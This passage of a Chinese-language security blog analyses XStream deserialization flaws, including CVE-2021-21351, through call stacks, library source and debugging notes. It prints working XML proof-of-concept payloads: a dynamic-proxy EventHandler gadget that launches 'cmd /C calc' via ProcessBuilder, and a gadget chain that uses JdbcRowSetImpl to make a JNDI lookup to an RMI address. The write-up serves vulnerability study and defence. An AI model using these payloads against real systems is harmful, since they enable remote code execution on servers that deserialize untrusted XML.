<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="type">List</span> <span class="variable">interfaces</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">    <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析dynamic-proxy里的interface和handler</span></span><br><span class="line">    Class handlerType;</span><br><span class="line">    <span class="keyword">for</span>(handlerType = <span class="literal">null</span>; reader.hasMoreChildren(); reader.moveUp()) &#123;</span><br><span class="line">        reader.moveDown();</span><br><span class="line">        <span class="type">String</span> <span class="variable">elementName</span> <span class="operator">=</span> reader.getNodeName();</span><br><span class="line">        <span class="comment">// 匹配interface</span></span><br><span class="line">        <span class="keyword">if</span> (elementName.equals(<span class="string">&quot;interface&quot;</span>)) &#123;</span><br><span class="line">            interfaces.add(<span class="built_in">this</span>.mapper.realClass(reader.getValue()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (elementName.equals(<span class="string">&quot;handler&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 匹配handler</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">attributeName</span> <span class="operator">=</span> <span class="built_in">this</span>.mapper.aliasForSystemAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (attributeName != <span class="literal">null</span>) &#123;</span><br><span class="line">                handlerType = <span class="built_in">this</span>.mapper.realClass(reader.getAttribute(attributeName));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handlerType == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConversionException</span>(<span class="string">&quot;No InvocationHandler specified for dynamic proxy&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class[] interfacesAsArray = <span class="keyword">new</span> <span class="title class_">Class</span>[interfaces.size()];</span><br><span class="line">        interfaces.toArray(interfacesAsArray);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">proxy</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (HANDLER != <span class="literal">null</span>) &#123;</span><br><span class="line">            proxy = Proxy.newProxyInstance(<span class="built_in">this</span>.classLoaderReference.getReference(), interfacesAsArray, DUMMY);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 解析handler标签下的东西，解析流程和上面一致</span></span><br><span class="line">        handler = (InvocationHandler)context.convertAnother(proxy, handlerType);</span><br><span class="line">        reader.moveUp();</span><br><span class="line">        <span class="keyword">if</span> (HANDLER != <span class="literal">null</span>) &#123;</span><br><span class="line">            Fields.write(HANDLER, proxy, handler);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            proxy = Proxy.newProxyInstance(<span class="built_in">this</span>.classLoaderReference.getReference(), interfacesAsArray, handler);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行到最后的return，结果如下：<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719200939.png"><br>然后又一直return，回到TreeMapConverter的populateTreeMap函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719202237.png"><br>这里的result是TreeMap<br>接着进入TreeMap的putAll函数，然后调用父类(Abstract)的putAll，接着又来到TreeMap的put方法，此时的k是代理类，它代理的是EventHandler类<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719210542.png"><br>执行到这里的时候会通过EventHandler的invoke方法调用compareTo方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(<span class="keyword">final</span> Object proxy, <span class="keyword">final</span> Method method, <span class="keyword">final</span> Object[] arguments)</span> &#123;</span><br><span class="line">    <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="built_in">this</span>.acc;</span><br><span class="line">    <span class="keyword">if</span> ((acc == <span class="literal">null</span>) &amp;&amp; (System.getSecurityManager() != <span class="literal">null</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;AccessControlContext is not set&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Object&gt;() &#123;</span><br><span class="line">        <span class="comment">// 会执行这里</span></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> invokeInternal(proxy, method, arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, acc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>会继续执行至invokeInternal函数,直到下面这行代码<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230719205925.png"><br>这里的targetMethod方法正是java.lang.ProcessBuilder.start(),而这里的targetMethod方法是从上面的代码获取来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (targetMethod == <span class="literal">null</span>) &#123;</span><br><span class="line">    targetMethod = Statement.getMethod(target.getClass(),</span><br><span class="line">                <span class="string">&quot;set&quot;</span> + NameGenerator.capitalize(action), argTypes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">invokeInternal:<span class="number">482</span>, EventHandler (java.beans)</span><br><span class="line">access$<span class="number">000</span>:<span class="number">279</span>, EventHandler (java.beans)</span><br><span class="line">run:<span class="number">430</span>, EventHandler$<span class="number">1</span> (java.beans)</span><br><span class="line">doPrivileged:-<span class="number">1</span>, AccessController (java.security)</span><br><span class="line">invoke:<span class="number">428</span>, EventHandler (java.beans)</span><br><span class="line">compareTo:-<span class="number">1</span>, $Proxy0 (com.sun.proxy)</span><br><span class="line">put:<span class="number">568</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">122</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:<span class="number">94</span>, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1157</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1141</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1012</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1003</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">24</span>, CVE20137258 (Xstream)</span><br></pre></td></tr></table></figure>

<p>到这里，整个过程就结束了，<strong>总结如下</strong>：</p>
<ol>
<li>从com.thoughtworks.xstream.core.TreeUnmarshaller的start函数开始，执行HierarchicalStreams.readClassType，通过标签名从Mapper中获取对应的class对象</li>
<li>获得class对象后返回至start函数，来到TreeUnmarshaller的convertAnother函数，该方法将上面返回的类转换成Java对象<ul>
<li>通过mapper.defaultImplementationOf方法查找class的实现类</li>
<li>通过converterLookup.lookupConverterForType根据对应的类寻找正确的转换器Converter</li>
<li>调用AbstractReferenceUnmarshaller的convert方法获得对应的对象<ul>
<li>根据获取到的Converter，调用unmarshal方法，读取其子节点，并转化成对应的变量，直到所有节点解析完成</li>
</ul>
</li>
</ul>
</li>
</ol>
<p>另一个POC：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">tree-map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>cmd<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>/C<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>good<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tree-map</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里通过this.converterLookup.lookupConverterForType函数得到的converter是TreeMapConverter<br>而TreeMapConverter的unmarshal函数如下,相对来讲对比于TreeSetConverter转换器的unmarshal函数，少了很多判断条件，即限制</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">unmarshal</span><span class="params">(HierarchicalStreamReader reader, UnmarshallingContext context)</span> &#123;</span><br><span class="line">    <span class="type">TreeMap</span> <span class="variable">result</span> <span class="operator">=</span> comparatorField != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">TreeMap</span>() : <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 判断是否存在comparator</span></span><br><span class="line">    <span class="type">Comparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="built_in">this</span>.unmarshalComparator(reader, context, result);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="literal">null</span>) &#123;</span><br><span class="line">        result = comparator == <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">TreeMap</span>() : <span class="keyword">new</span> <span class="title class_">TreeMap</span>(comparator);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">this</span>.populateTreeMap(reader, context, result, comparator);</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他过程与上面同理</p>
<h1 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h1><p><strong>影响版本</strong>：&lt;&#x3D;1.4.15<br><strong>测试环境</strong>：XStream1.4.15 jdk1.8_66<br><strong>漏洞复现</strong>：<br>POC</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtm</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__size</span>&gt;</span>-10086<span class="tag">&lt;/<span class="name">m__size</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__incremental</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__incremental</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__source__location</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__source__location</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">m__dtms</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">m__defaultHandler</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__mgrDefault</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__shouldStripWS</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__shouldStripWS</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__indexing</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__indexing</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__incrementalSAXSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fPullParserConfig</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">listeners</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fPullParserConfig</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.rowset.JdbcRowSetImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">name</span>&gt;</span>setAutoCommit<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">class</span>&gt;</span>boolean<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">parameter-types</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">fConfigSetInput</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fConfigParse</span> <span class="attr">reference</span>=<span class="string">&#x27;../fConfigSetInput&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">fParseInProgress</span>&gt;</span>false<span class="tag">&lt;/<span class="name">fParseInProgress</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__incrementalSAXSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__walker</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">nextIsRaw</span>&gt;</span>false<span class="tag">&lt;/<span class="name">nextIsRaw</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">m__walker</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__endDocumentOccured</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__endDocumentOccured</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__idAttributes</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__textPendingStart</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">m__textPendingStart</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__useSourceLocationProperty</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__useSourceLocationProperty</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">m__pastFirstElement</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__pastFirstElement</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">m__dtm</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">m__dtmIdentity</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmIdentity</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">m__DTMXRTreeFrag</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__dtmRoot</span>&gt;</span>1<span class="tag">&lt;/<span class="name">m__dtmRoot</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__allowRelease</span>&gt;</span>false<span class="tag">&lt;/<span class="name">m__allowRelease</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">m__obj</span> <span class="attr">class</span>=<span class="string">&#x27;string&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">m__obj</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>官方的POC和这个不太一致，使用后会报如下错误</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">---- Debugging information ----</span><br><span class="line">message             : No such field com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault._overrideDefaultParser</span><br><span class="line">field               : _overrideDefaultParser</span><br><span class="line">class               : com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault</span><br><span class="line">required-type       : com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault</span><br><span class="line">converter-type      : com.thoughtworks.xstream.converters.reflection.ReflectionConverter</span><br><span class="line">path                : /sorted-set/javax.naming.ldap.Rdn$RdnEntry/value/m_DTMXRTreeFrag/m_dtm/m_mgrDefault/_overrideDefaultParser</span><br></pre></td></tr></table></figure>

<p>这里表示com.sun.org.apache.xml.internal.dtm.ref.DTMManagerDefault类中没有_overrideDefaultParser这个字段，于是查阅了JDK1.8_66外部包的这个类，确实没有找到该字段，于是就删除了官方POC中下面这句就得到了以上的POC</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">__overrideDefaultParser</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__overrideDefaultParser</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里猜测应该是跟JDK版本有关,经查阅资料，这个属性在JDK低版本中是没有的，相关的博客也提到，可以更换成下面这句</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">__useServicesMechanism</span>&gt;</span>false<span class="tag">&lt;/<span class="name">__useServicesMechanism</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>分析</strong><br>函数调用栈</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">getObjectFactoryFromReference:<span class="number">142</span>, NamingManager (javax.naming.spi)</span><br><span class="line">getObjectInstance:<span class="number">319</span>, NamingManager (javax.naming.spi)</span><br><span class="line">decodeObject:<span class="number">464</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">124</span>, RegistryContext (com.sun.jndi.rmi.registry)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">connect:<span class="number">624</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:<span class="number">4067</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">parseSome:<span class="number">373</span>, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">deliverMoreNodes:<span class="number">312</span>, IncrementalSAXSource_Xerces (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">nextNode:<span class="number">814</span>, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">_firstch:<span class="number">535</span>, DTMDefaultBase (com.sun.org.apache.xml.internal.dtm.ref)</span><br><span class="line">getStringValue:<span class="number">1294</span>, SAX2DTM (com.sun.org.apache.xml.internal.dtm.ref.sax2dtm)</span><br><span class="line">str:<span class="number">207</span>, XRTreeFrag (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">toString:<span class="number">314</span>, XObject (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">equals:<span class="number">392</span>, XString (com.sun.org.apache.xpath.internal.objects)</span><br><span class="line">compareTo:<span class="number">441</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">compareTo:<span class="number">420</span>, Rdn$RdnEntry (javax.naming.ldap)</span><br><span class="line">put:<span class="number">568</span>, TreeMap (java.util)</span><br><span class="line">putAll:<span class="number">281</span>, AbstractMap (java.util)</span><br><span class="line">putAll:<span class="number">327</span>, TreeMap (java.util)</span><br><span class="line">populateTreeMap:<span class="number">121</span>, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:<span class="number">92</span>, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">72</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1409</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1388</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1273</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">1264</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">81</span>, CVE202121351 (Xstream)</span><br></pre></td></tr></table></figure>

<p>上面这些xml解析过程直接跳过，可以看到sorted-set里面嵌套的是两个&lt;javax.naming.ldap.Rdn_-RdnEntry&gt;，在分析CVE-2013-7258上可知，出发点在TreeMap的putAll函数，顺着来到put函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720154132.png"><br>进入到Rdn$RdnEntry的compareTo函数，将两者的value进行对比<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720153920.png"><br>然后value的值设置的是com.sun.org.apache.xpath.internal.objects.XRTreeFrag，会调用它的equal函数<br>接着一直来到XRTreeFrag的str函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">str</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> m_DTMXRTreeFrag.getDTM().getStringValue(m_dtmRoot).toString();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="literal">null</span> == str) ? <span class="string">&quot;&quot;</span> : str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过m_DTMXRTreeFrag.getDTM()函数就可以获得我们设置的m_dtm为SAX2DTM，然后调用其getStringValue函数<br>最后经过层层递进来到com&#x2F;sun&#x2F;org&#x2F;apache&#x2F;xml&#x2F;internal&#x2F;dtm&#x2F;ref&#x2F;IncrementalSAXSource_Xerces的parseSome函数<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230720155445.png"><br>在POC中对响应的参数如fPullParserConfig设置成了类JdbcRowSetImpl，接下来就是使用JdbcRowSetImpl这个类去远程加载恶意的类造成JNDI注入了</p>
<h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><p>XStream为了防护这些漏洞，直接使用黑名单的方式对可利用链的相关类进行拦截，如1.4.15中XStream.class类中的setupSecurity函数</p>
